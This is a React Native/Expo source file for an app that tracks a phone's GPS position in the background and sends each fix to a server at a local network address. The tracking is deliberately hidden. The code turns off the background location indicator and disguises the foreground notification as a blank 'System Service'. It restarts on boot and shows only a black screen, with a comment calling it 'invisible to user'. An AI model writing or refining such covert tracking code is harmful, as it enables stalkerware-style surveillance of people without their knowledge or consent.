import { useEffect } from 'react';
import { View } from 'react-native';
import * as Location from 'expo-location';
import * as TaskManager from 'expo-task-manager';
import * as BackgroundFetch from 'expo-background-fetch';

const SERVER = 'http://192.168.68.105:5000';
const LOCATION_TASK = 'background-location';
const FETCH_TASK = 'background-fetch';

// ── Background location task ─────────────────────────────────────────────────
TaskManager.defineTask(LOCATION_TASK, ({ data, error }) => {
  if (error || !data) return;
  const { locations } = data;
  if (!locations?.length) return;
  const { latitude, longitude, accuracy } = locations[0].coords;
  fetch(`${SERVER}/api/ingest/location`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      lat: latitude,
      lon: longitude,
      accuracy,
      ts: new Date().toISOString(),
      device: 'iPhone',
    }),
  }).catch(() => {});
});

// ── Background fetch task (keeps app alive) ───────────────────────────────────
TaskManager.defineTask(FETCH_TASK, async () => {
  try {
    const loc = await Location.getCurrentPositionAsync({});
    await fetch(`${SERVER}/api/ingest/location`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        lat: loc.coords.latitude,
        lon: loc.coords.longitude,
        accuracy: loc.coords.accuracy,
        ts: new Date().toISOString(),
        device: 'iPhone',
      }),
    });
  } catch {}
  return BackgroundFetch.BackgroundFetchResult.NewData;
});

export default function App() {
  useEffect(() => {
    setup();
  }, []);

  async function setup() {
    // Request location permissions
    const { status: fg } = await Location.requestForegroundPermissionsAsync();
    if (fg !== 'granted') return;
    const { status: bg } = await Location.requestBackgroundPermissionsAsync();
    if (bg !== 'granted') return;

    // Start background location tracking
    await Location.startLocationUpdatesAsync(LOCATION_TASK, {
      accuracy: Location.Accuracy.High,
      distanceInterval: 50,          // update every 50 metres
      timeInterval: 5 * 60 * 1000,   // or every 5 minutes
      showsBackgroundLocationIndicator: false,
      pausesUpdatesAutomatically: false,
      foregroundService: {
        notificationTitle: 'System Service',
        notificationBody: '',
        notificationColor: '#000000',
      },
    });

    // Register background fetch (every 5 minutes)
    await BackgroundFetch.registerTaskAsync(FETCH_TASK, {
      minimumInterval: 5 * 60,
      stopOnTerminate: false,
      startOnBoot: true,
    });
  }

  // Blank black screen — invisible to user
  return <View style={{ flex: 1, backgroundColor: '#000' }} />;
}
